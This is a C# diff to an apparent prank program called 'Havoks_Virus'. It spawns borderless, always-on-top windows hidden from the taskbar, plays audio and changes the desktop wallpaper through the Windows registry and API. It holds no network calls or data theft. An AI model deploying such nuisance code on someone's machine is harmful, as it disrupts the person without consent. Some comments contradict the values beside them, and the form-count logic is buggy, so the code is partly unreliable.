@@ -15,103 +15,110 @@ namespace Havoks_Virus
         private int currentFrame = 0; // Tracks the current frame of the GIF
         private Timer moveTimer = new Timer(); // Timer for controlling movement speed
         private static int formCount = 0; // Keep track of the number of forms
-        private const int maxForms = 10;  // Maximum number of forms allowed ..... Don't actually kill their PC 6-10 seem to work perfect
+        private const int maxForms = 10;  // Maximum number of forms allowed ..... Count starts from zero
         private List<Image> loadedImages = new List<Image>(); // To store loaded images
-        private static List<PrankForm> openForms = new List<PrankForm>();
-        private Timer wallpaperTimer = new Timer();
-        private string originalWallpaperPath;
-        //private Audio backgroundAudio;
-        //private Audio sharedAudio = new Audio();
-        private static Audio sharedAudio = new Audio(); //This is the correct way to construct the audio as the two lines above create overlaps 
-        private Random random = new Random();
-
+        private static List<PrankForm> openForms = new List<PrankForm>(); // Track all open forms
+        private Timer wallpaperTimer = new Timer(); // Timer for changing the wallpaper
+        private string originalWallpaperPath; // To store the path of the original wallpaper
+        private static Audio sharedAudio = new Audio(); // Audio system for the prank form
+        private Random random = new Random(); // Random number generator
+        private static bool IsWallpaperSet = false; // Track if wallpaper is set
+        private static bool wallpaperSet = false; // Ensure wallpaper is only set once
 
         public PrankForm()
         {
             InitializeComponent();
-            SetupMovementTimer();
-            originalWallpaperPath = GetOriginalWallpaperPath(); // Store original wallpaper path
-            ExtractFramesFromGif("Media/blade.gif");
-            LoadContentAsync(); // Load content asynchronously
-            SetupTimer();
-            SetupWallpaperChangeTimer();
-            //sharedAudio = new Audio(); // Initialize the background audio
-            //sharedAudio.Start(); // Start playing background audio
+            this.DoubleBuffered = true; // Reduce flickering effect
 
-            openForms.Add(this); // Track this form
+            this.Size = new Size(200, 200); // Set the size of the prank form
+            LoadAndDisplayGif("Media/blade.gif"); // Synchronously load and display GIF
+
+            //SetupMovementTimer(); // Configure movement for the prank form
+            SetupTimer(); // Configure how often to update form properties
+
+            SetInitialWallpaper(); // Set the initial wallpaper once
+
+            originalWallpaperPath = GetOriginalWallpaperPath(); // Keep original wallpaper path for later restoration
+            ExtractFramesFromGif("Media/blade.gif"); // Extract frames for any gif animations
+            LoadContentAsync(); // Load heavy content asynchronously to keep UI responsive
+
+            System.Console.WriteLine($"Form {formCount} created."); // Count the forms being spawned for testing
+
+            openForms.Add(this); // Add this form to the tracking list
             formCount++; // Increment the global form count
 
-
-            this.Size = new Size(200, 200);
-
-            // Only initiate additional forms if under the maximum limit
-            if (formCount < maxForms)
+            if (formCount <= maxForms)
             {
-                // Only create additional forms from the first form
                 if (openForms.Count == 1)
                 {
-                    CreateFormsForAllScreens();
+                    CreateFormsForAllScreens(); // Create forms for all screens
                 }
 
-                // Setup timer to spawn additional forms
-                Timer spawnTimer = new Timer();
-                spawnTimer.Interval = 8000; // 8 seconds, adjust as needed
+                Timer spawnTimer = new Timer { Interval = 8000 }; // Timer to spawn additional forms
                 spawnTimer.Tick += (sender, e) => SpawnAdditionalForm();
                 spawnTimer.Start();
 
-                // Setup wallpaper change timer
-                Timer wallpaperTimer = new Timer();
-                wallpaperTimer.Interval = 30000; // 30 seconds
-                wallpaperTimer.Tick += (sender, e) => ChangeWallpaper();
-                wallpaperTimer.Start();
-
-                // Set initial wallpaper
-                string wallpaperPath = Application.StartupPath + "\\Media\\wallpaper.jpg";
-                System.Console.WriteLine("Attempting to set wallpaper from: " + wallpaperPath);
-                WallpaperChanger.SetWallpaper(wallpaperPath, WallpaperChanger.Style.Stretched);
-
-                // Initialize shared audio once for the first form
-                if (formCount == 0)
+                if (formCount == 1) // Only initialize once
                 {
-                    sharedAudio = new Audio(); // Initialize only once          // Remove this line as it causes the audio to overlap multiple times sounds pretty cool though - once it's removed it only doubles
-                    sharedAudio.Start(); // Start playing background audio
+                    sharedAudio = new Audio();
+                    sharedAudio.Start();
                 }
 
-                openForms.Add(this);
-                formCount++;
+                // Set the wallpaper if not already set
+                if (!wallpaperSet)
+                {
+                    string wallpaperPath = Application.StartupPath + "\\Media\\wallpaper.jpg";
+                    System.Console.WriteLine($"Setting wallpaper from: {wallpaperPath}");
+                    WallpaperChanger.SetWallpaper(wallpaperPath, WallpaperChanger.Style.Stretched);
+                    wallpaperSet = true; // Mark that the wallpaper has now been set
+
+                    openForms.Add(this); // Add this form to the tracking list
+                    formCount++; // Increment the global form count
+                }
             }
+
+            // Delayed or conditional actions (commented out for potential future use)
+            // Task.Delay(7000).ContinueWith(t => StartJobSearch()); // Adjust delay as needed
+            // StartJobSearchWithDelay(); // Delay the start of the job search
+            // sharedAudio = new Audio(); // Initialize the background audio (if needed)
+            // sharedAudio.Start(); // Start playing background audio (if needed)
         }
-
-        private void openCmdButton_Click(object sender, EventArgs e)
-        {
-            TerminalOpener.OpenCommandPrompt();
-        }
-
-
-        private void someButton_Click(object sender, EventArgs e)
-        {
-            System.Console.WriteLine("Button Clicked");
-            // Perform button click operations
-        }
-
 
         private void InitializeComponent()
         {
-            // Initialize and configure PictureBox
             this.pictureBox.Dock = DockStyle.Fill;
             this.pictureBox.SizeMode = PictureBoxSizeMode.StretchImage;
             this.Controls.Add(pictureBox);
 
-            // Configure form properties
-            this.FormBorderStyle = FormBorderStyle.None; // No borders
-            this.TopMost = true; // Always on top
-            this.StartPosition = FormStartPosition.CenterScreen; // Center screen
-            this.Size = new Size(200, 200); // Size of the form
-            this.BackColor = Color.Black; // Background color
-            this.TransparencyKey = Color.Black; // Make the same color transparent
-            this.ShowInTaskbar = false;  // Hide form from appearing in the taskbar
-            this.ResumeLayout(false);
+            this.FormBorderStyle = FormBorderStyle.None;
+            this.TopMost = true;
+            this.StartPosition = FormStartPosition.CenterScreen;
+            this.Size = new Size(200, 200);
+            this.BackColor = Color.Black;
+            this.TransparencyKey = Color.Black;
+            this.ShowInTaskbar = false;
+        }
 
+        private void LoadAndDisplayGif(string gifPath)
+        {
+            // Load the GIF image from the specified path
+            Image gifImg = Image.FromFile(gifPath);
+
+            // Extract frames and assign the first frame to the PictureBox
+            FrameDimension dimension = new FrameDimension(gifImg.FrameDimensionsList[0]);
+            int frameCount = gifImg.GetFrameCount(dimension);
+            for (int i = 0; i < frameCount; i++)
+            {
+                gifImg.SelectActiveFrame(dimension, i);
+                gifFrames.Add((Image)gifImg.Clone());
+            }
+
+            if (gifFrames.Count > 0)
+            {
+                pictureBox.Image = gifFrames[0]; // Display the first frame
+            }
+
+            SetupTimer(); // Setup timer for GIF frame update
         }
 
         private string GetOriginalWallpaperPath()
@@ -119,17 +126,22 @@ namespace Havoks_Virus
             return Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop")?.GetValue("WallPaper").ToString() ?? string.Empty;
         }
 
-        private void SetupWallpaperChangeTimer()
+        private void SetInitialWallpaper()
         {
-            wallpaperTimer.Interval = 1000; // 30 seconds
-            wallpaperTimer.Tick += (sender, e) => ChangeWallpaper();
-            wallpaperTimer.Start();
+            // Ensure wallpaper is set only once across all instances
+            if (!IsWallpaperSet)
+            {
+                ChangeWallpaper();
+                IsWallpaperSet = true; // Prevent further wallpaper changes
+            }
         }
 
         private void ChangeWallpaper()
         {
-            string wallpaperPath = Path.Combine(Application.StartupPath, "Media\\wallpaper.jpg");
-            WallpaperChanger.SetWallpaper(wallpaperPath, WallpaperChanger.Style.Stretched); // Choose style as needed
+            // Method to actually change the wallpaper
+            string wallpaperPath = Application.StartupPath + "\\Media\\wallpaper.jpg";
+            System.Console.WriteLine($"Setting wallpaper from: {wallpaperPath}");
+            WallpaperChanger.SetWallpaper(wallpaperPath, WallpaperChanger.Style.Stretched);
         }
 
         private void ExtractFramesFromGif(string path)
@@ -146,7 +158,7 @@ namespace Havoks_Virus
 
         private void SetupTimer()
         {
-            moveTimer.Interval = new Random().Next(100, 1000); // Random movement speed for each form
+            moveTimer.Interval = new Random().Next(15000, 35000); // Random movement speed for each form
             moveTimer.Tick += new EventHandler(OnTimerTick);
             moveTimer.Start();
         }
@@ -172,8 +184,10 @@ namespace Havoks_Virus
             // Make sure to marshal these calls back to the UI thread!
             this.Invoke(new Action(() =>
             {
+                
                 // Update your form with the loaded content
             }));
+            await Task.Run(() => LoadHeavyContent());
         }
 
         private void LoadHeavyContent()
@@ -232,13 +246,20 @@ namespace Havoks_Virus
 
         private System.ComponentModel.IContainer? components = null;
 
+        // Ensure proper disposal of resources or any additional cleanup if necessary
         protected override void Dispose(bool disposing)
         {
-            if (disposing && (components != null))
+            if (disposing)
             {
-                components.Dispose();
+                // Dispose managed resources
+                components?.Dispose();
+                moveTimer?.Dispose();
+                wallpaperTimer?.Dispose();
+                // Dispose any other resources created in your form
             }
-            // Dispose of other resources here
+
+            // Dispose unmanaged resources if any
+
             base.Dispose(disposing);
         }
 
@@ -300,7 +321,11 @@ namespace Havoks_Virus
 
         private void SetupMovementTimer()
         {
-            movementTimer.Interval = 1000; // Adjust as needed for movement frequency
+            Random rng = new Random();
+            int minInterval = 1000; // Minimum interval in milliseconds (2.5 seconds)
+            int maxInterval = 8000; // Maximum interval in milliseconds (11 seconds)
+
+            movementTimer.Interval = rng.Next(minInterval, maxInterval); // Set a random interval between the min and max
             movementTimer.Tick += (sender, e) => RepositionFormRandomly();
             movementTimer.Start();
         }
